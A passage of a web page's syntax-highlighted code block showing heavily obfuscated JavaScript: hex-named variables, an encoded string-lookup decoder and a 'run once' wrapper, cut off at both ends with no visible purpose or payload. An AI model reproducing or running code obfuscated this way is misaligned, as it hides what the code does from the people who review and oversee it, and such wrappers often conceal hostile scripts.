punctuation">[</span><span class="token number">0xc07</span><span class="token operator">+</span><span class="token number">0x2228</span><span class="token operator">+</span><span class="token number">0x3</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0xf65</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'VDwzLi'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3d3b23<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x4e8342<span class="token punctuation">[</span><span class="token string">'prototype'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'VDwzLi'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0xa402ba</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token operator">~</span>_0xa402ba<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> _0xa402ba<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'xwZujq'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'vOUKmO'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x4e8342<span class="token punctuation">[</span><span class="token string">'prototype'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'xwZujq'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x65f30f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> _0x23db3e<span class="token operator">=</span><span class="token operator">-</span><span class="token number">0x2</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x1304</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x1</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x19b</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x27a3</span><span class="token punctuation">,</span>_0x1e8117<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'VyUlWP'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>_0x23db3e<span class="token operator">&lt;</span>_0x1e8117<span class="token punctuation">;</span>_0x23db3e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'VyUlWP'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>Math<span class="token punctuation">[</span><span class="token string">'round'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>Math<span class="token punctuation">[</span><span class="token string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x1e8117<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'VyUlWP'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token function">_0x65f30f</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">'VyUlWP'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0x3a2</span><span class="token operator">+</span><span class="token number">0x779</span><span class="token operator">*</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x3d7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">_0x4e8342</span><span class="token punctuation">(</span>_0x2fa2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'wDfUYW'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x32bbf7<span class="token operator">=</span>_0x2fa2<span class="token punctuation">[</span><span class="token string">'iNUHtA'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x32bbf7<span class="token punctuation">)</span><span class="token punctuation">,</span>_0x4dde84<span class="token punctuation">[</span>_0xf7632<span class="token punctuation">]</span><span class="token operator">=</span>_0x32bbf7<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> _0x32bbf7<span class="token operator">=</span>_0x5c718f<span class="token punctuation">;</span><span class="token keyword">return</span> _0x32bbf7<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x4dde84<span class="token punctuation">,</span>_0x478812<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> _0x335615<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x3d32fd<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x4dd412</span><span class="token operator">:</span><span class="token number">0x4b3</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2e30cb</span><span class="token operator">:</span><span class="token number">0x4c9</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1d7e3f</span><span class="token operator">:</span><span class="token number">0x4b3</span><span class="token punctuation">,</span><span class="token literal-property property">_0x505055</span><span class="token operator">:</span><span class="token number">0x49c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x898066</span><span class="token operator">:</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token literal-property property">_0x437ed2</span><span class="token operator">:</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token literal-property property">_0xb80b08</span><span class="token operator">:</span><span class="token number">0x4c1</span><span class="token punctuation">,</span><span class="token literal-property property">_0x41955e</span><span class="token operator">:</span><span class="token number">0x4b5</span><span class="token punctuation">,</span><span class="token literal-property property">_0x226e13</span><span class="token operator">:</span><span class="token number">0x4b8</span><span class="token punctuation">,</span><span class="token literal-property property">_0x527505</span><span class="token operator">:</span><span class="token number">0x4ba</span><span class="token punctuation">,</span><span class="token literal-property property">_0x45ce2c</span><span class="token operator">:</span><span class="token number">0x4de</span><span class="token punctuation">,</span><span class="token literal-property property">_0x16e492</span><span class="token operator">:</span><span class="token number">0x4dd</span><span class="token punctuation">,</span><span class="token literal-property property">_0x165aa5</span><span class="token operator">:</span><span class="token number">0x4e0</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3511bd</span><span class="token operator">:</span><span class="token number">0x502</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x42d65f<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x2ddf3c</span><span class="token operator">:</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token literal-property property">_0x402929</span><span class="token operator">:</span><span class="token number">0xcd</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4f6aa1</span><span class="token operator">:</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token literal-property property">_0x417947</span><span class="token operator">:</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5c83e3</span><span class="token operator">:</span><span class="token number">0xcf</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3fcd55</span><span class="token operator">:</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token literal-property property">_0x30ce5c</span><span class="token operator">:</span><span class="token number">0xde</span><span class="token punctuation">,</span><span class="token literal-property property">_0x264507</span><span class="token operator">:</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1c0668</span><span class="token operator">:</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4241c9</span><span class="token operator">:</span><span class="token number">0x97</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1e3a87</span><span class="token operator">:</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token literal-property property">_0x37379e</span><span class="token operator">:</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token literal-property property">_0x50678c</span><span class="token operator">:</span><span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3df9e5</span><span class="token operator">:</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token literal-property property">_0x19ebaf</span><span class="token operator">:</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4ec263</span><span class="token operator">:</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1f45ec</span><span class="token operator">:</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2e359a</span><span class="token operator">:</span><span class="token number">0x11b</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1bb5a5</span><span class="token operator">:</span><span class="token number">0x123</span><span class="token punctuation">,</span><span class="token literal-property property">_0x498c1f</span><span class="token operator">:</span><span class="token number">0xed</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5c94ca</span><span class="token operator">:</span><span class="token number">0x111</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x217b59<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x138f06</span><span class="token operator">:</span><span class="token number">0x1cf</span><span class="token punctuation">,</span><span class="token literal-property property">_0x327865</span><span class="token operator">:</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1b3b35</span><span class="token operator">:</span><span class="token number">0xf9</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x2789f1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x22fbb1</span><span class="token operator">:</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3fd558</span><span class="token operator">:</span><span class="token number">0x3e5</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3623a4</span><span class="token operator">:</span><span class="token number">0x1cd</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x2087ec<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x33f829</span><span class="token operator">:</span><span class="token number">0xb4</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x147f99<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x3bef6d</span><span class="token punctuation">(</span><span class="token parameter">_0x5b56d3<span class="token punctuation">,</span>_0x3a091c<span class="token punctuation">,</span>_0x130de8<span class="token punctuation">,</span>_0x562c6f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x562c6f<span class="token operator">-</span> <span class="token operator">-</span>_0x2087ec<span class="token punctuation">.</span>_0x33f829<span class="token punctuation">,</span>_0x5b56d3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>_0x147f99<span class="token punctuation">[</span><span class="token function">_0x3ca6da</span><span class="token punctuation">(</span>_0x3d32fd<span class="token punctuation">.</span>_0x4dd412<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x2e30cb<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x1d7e3f<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x505055<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0x3bef6d</span><span class="token punctuation">(</span>_0x3d32fd<span class="token punctuation">.</span>_0x898066<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x437ed2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x3ca6da</span><span class="token punctuation">(</span><span class="token parameter">_0x3fe9d1<span class="token punctuation">,</span>_0xe366d9<span class="token punctuation">,</span>_0x25f5a3<span class="token punctuation">,</span>_0x379f71</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x25f5a3<span class="token operator">-</span><span class="token number">0x3e4</span><span class="token punctuation">,</span>_0xe366d9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>_0x147f99<span class="token punctuation">[</span><span class="token function">_0x3ca6da</span><span class="token punctuation">(</span>_0x3d32fd<span class="token punctuation">.</span>_0xb80b08<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x41955e<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x226e13<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x527505<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0x3ca6da</span><span class="token punctuation">(</span>_0x3d32fd<span class="token punctuation">.</span>_0x45ce2c<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x16e492<span class="token punctuation">,</span><span class="token number">0x4ce</span><span class="token punctuation">,</span><span class="token number">0x4d0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x147f99<span class="token punctuation">[</span><span class="token string">'ZZqwF'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0x3ca6da</span><span class="token punctuation">(</span>_0x3d32fd<span class="token punctuation">.</span>_0x45ce2c<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0xb80b08<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x165aa5<span class="token punctuation">,</span>_0x3d32fd<span class="token punctuation">.</span>_0x3511bd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _0x3d4fb9<span class="token operator">=</span>_0x147f99<span class="token punctuation">,</span>_0x3b189a<span class="token operator">=</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x4c04a2<span class="token punctuation">,</span>_0x24bac0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x11031c<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x14b596</span><span class="token operator">:</span><span class="token number">0xd</span><span class="token punctuation">,</span><span class="token literal-property property">_0x170af6</span><span class="token operator">:</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3a5b25</span><span class="token operator">:</span><span class="token number">0x4</span><span class="token punctuation">,</span><span class="token literal-property property">_0x46e1f8</span><span class="token operator">:</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token literal-property property">_0x117854</span><span class="token operator">:</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token literal-property property">_0x53a9fb</span><span class="token operator">:</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5455dc</span><span class="token operator">:</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2b5959</span><span class="token operator">:</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token literal-property property">_0x34c283</span><span class="token operator">:</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1d9e57</span><span class="token operator">:</span><span class="token number">0x4ed</span><span class="token punctuation">,</span><span class="token literal-property property">_0xb9a172</span><span class="token operator">:</span><span class="token number">0x4ff</span><span class="token punctuation">,</span><span class="token literal-property property">_0xe479af</span><span class="token operator">:</span><span class="token number">0x4ea</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4adc73</span><span class="token operator">:</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token literal-property property">_0x426376</span><span class="token operator">:</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5ddded</span><span class="token operator">:</span><span class="token number">0x3e</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x49bbd1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x4145d7</span><span class="token punctuation">(</span><span class="token parameter">_0x509318<span class="token punctuation">,</span>_0x4ce127<span class="token punctuation">,</span>_0x11b7da<span class="token punctuation">,</span>_0x381469</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x3ca6da</span><span class="token punctuation">(</span>_0x509318<span class="token operator">-</span>_0x2789f1<span class="token punctuation">.</span>_0x22fbb1<span class="token punctuation">,</span>_0x11b7da<span class="token punctuation">,</span>_0x381469<span class="token operator">-</span> <span class="token operator">-</span>_0x2789f1<span class="token punctuation">.</span>_0x3fd558<span class="token punctuation">,</span>_0x381469<span class="token operator">-</span>_0x2789f1<span class="token punctuation">.</span>_0x3623a4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>_0x49bbd1<span class="token punctuation">[</span><span class="token function">_0x4145d7</span><span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x2ddf3c<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x402929<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x4f6aa1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x1d942d<span class="token punctuation">,</span>_0x50c3e4</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> _0x1d942d<span class="token operator">===</span>_0x50c3e4<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x472cde</span><span class="token punctuation">(</span><span class="token parameter">_0x277dde<span class="token punctuation">,</span>_0x742ce5<span class="token punctuation">,</span>_0x42937a<span class="token punctuation">,</span>_0x202bcf</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x3bef6d</span><span class="token punctuation">(</span>_0x277dde<span class="token punctuation">,</span>_0x742ce5<span class="token operator">-</span>_0x217b59<span class="token punctuation">.</span>_0x138f06<span class="token punctuation">,</span>_0x42937a<span class="token operator">-</span>_0x217b59<span class="token punctuation">.</span>_0x327865<span class="token punctuation">,</span>_0x42937a<span class="token operator">-</span> <span class="token operator">-</span>_0x217b59<span class="token punctuation">.</span>_0x1b3b35<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>_0x49bbd1<span class="token punctuation">[</span><span class="token function">_0x472cde</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x417947<span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x402929<span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x5c83e3<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0xad</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>_0x3d4fb9<span class="token punctuation">[</span><span class="token function">_0x472cde</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x3fcd55<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x30ce5c<span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x264507<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_0x49bbd1<span class="token punctuation">[</span><span class="token function">_0x472cde</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x1c0668<span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x4241c9<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x9d</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x1e3a87<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>_0x3d4fb9<span class="token punctuation">[</span><span class="token function">_0x4145d7</span><span class="token punctuation">(</span>_0x42d65f<span class="token punctuation">.</span>_0x37379e<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x50678c<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x3df9e5<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x19ebaf<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_0x49bbd1<span class="token punctuation">[</span><span class="token string">'JvBtk'</span><span class="token punctuation">]</span><span class="token operator">=</span>_0x3d4fb9<span class="token punctuation">[</span><span class="token function">_0x472cde</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x4ec263<span class="token punctuation">,</span><span class="token operator">-</span>_0x42d65f<span class="token punctuation">.</span>_0x1f45ec<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_0x49bbd1<span class="token punctuation">[</span><span class="token function">_0x4145d7</span><span class="token punctuation">(</span>_0x42d65f<span class="token punctuation">.</span>_0x2e359a<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x1bb5a5<span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x498c1f<span class="token punctuation">,</span><span class="token number">0x10e</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0x4145d7</span><span class="token punctuation">(</span><span class="token number">0x11a</span><span class="token punctuation">,</span>_0x42d65f<span class="token punctuation">.</span>_0x5c94ca<span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _0x2748d4<span class="token operator">=</span>_0x49bbd1<span class="token punctuation">,</span>_0x4a5a98<span class="token operator">=</span>_0x3b189a<span class="token operator">?</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x3de893<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x3f0d48</span><span class="token operator">:</span><span class="token number">0x1b7</span><span class="token punctuation">,</span><span class="token literal-property property">_0x40ca85</span><span class="token operator">:</span><span class="token number">0x1de</span><span class="token punctuation">,</span><span class="token literal-property property">_0x44cc63</span><span class="token operator">:</span><span class="token number">0x3e8</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x10455e<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x3083d1</span><span class="token operator">:</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token literal-property property">_0x632be9</span><span class="token operator">:</span><span class="token number">0x1b6</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0xbb3584</span><span class="token punctuation">(</span><span class="token parameter">_0x135760<span class="token punctuation">,</span>_0x1cecff<span class="token punctuation">,</span>_0x1b373f<span class="token punctuation">,</span>_0x2eb568</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x472cde</span><span class="token punctuation">(</span>_0x2eb568<span class="token punctuation">,</span>_0x1cecff<span class="token operator">-</span><span class="token number">0x1a8</span><span class="token punctuation">,</span>_0x135760<span class="token operator">-</span>_0x10455e<span class="token punctuation">.</span>_0x3083d1<span class="token punctuation">,</span>_0x2eb568<span class="token operator">-</span>_0x10455e<span class="token punctuation">.</span>_0x632be9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">_0x42ddc5</span><span class="token punctuation">(</span><span class="token parameter">_0x2531ca<span class="token punctuation">,</span>_0x3f3c80<span class="token punctuation">,</span>_0x35d7ae<span class="token punctuation">,</span>_0x118508</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x4145d7</span><span class="token punctuation">(</span>_0x2531ca<span class="token operator">-</span>_0x3de893<span class="token punctuation">.</span>_0x3f0d48<span class="token punctuation">,</span>_0x3f3c80<span class="token operator">-</span>_0x3de893<span class="token punctuation">.</span>_0x40ca85<span class="token punctuation">,</span>_0x118508<span class="token punctuation">,</span>_0x35d7ae<span class="token operator">-</span>_0x3de893<span class="token punctuation">.</span>_0x44cc63<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x2748d4<span class="token punctuation">[</span><span class="token string">'XbQPZ'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x2748d4<span class="token punctuation">[</span><span class="token string">'rdzih'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_0x2748d4<span class="token punctuation">[</span><span class="token function">_0xbb3584</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x14b596<span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x170af6<span class="token punctuation">,</span>_0x11031c<span class="token punctuation">.</span>_0x3a5b25<span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x46e1f8<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x137536<span class="token operator">=</span>_0x5b716f<span class="token punctuation">[</span><span class="token function">_0xbb3584</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x117854<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x53a9fb<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x1130dd<span class="token punctuation">,</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x16d37e<span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">,</span>_0x137536<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x24bac0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x2748d4<span class="token punctuation">[</span><span class="token function">_0xbb3584</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x5455dc<span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x2b5959<span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x34c283<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x2748d4<span class="token punctuation">[</span><span class="token function">_0x42ddc5</span><span class="token punctuation">(</span>_0x11031c<span class="token punctuation">.</span>_0x1d9e57<span class="token punctuation">,</span>_0x11031c<span class="token punctuation">.</span>_0xb9a172<span class="token punctuation">,</span>_0x11031c<span class="token punctuation">.</span>_0xe479af<span class="token punctuation">,</span><span class="token number">0x4ef</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>_0x2748d4<span class="token punctuation">[</span><span class="token string">'iiEnj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x2bd5a3<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x233e4b<span class="token operator">=</span>_0x31bac3<span class="token punctuation">[</span><span class="token function">_0xbb3584</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x4adc73<span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x426376<span class="token punctuation">,</span><span class="token operator">-</span>_0x11031c<span class="token punctuation">.</span>_0x5ddded<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x20c483<span class="token punctuation">,</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x2f7999<span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">,</span>_0x233e4b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x27b3a6<span class="token operator">=</span>_0x24bac0<span class="token punctuation">[</span><span class="token string">'apply'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x4c04a2<span class="token punctuation">,</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x24bac0<span class="token operator">=</span><span class="token keyword">null</span><span class="token 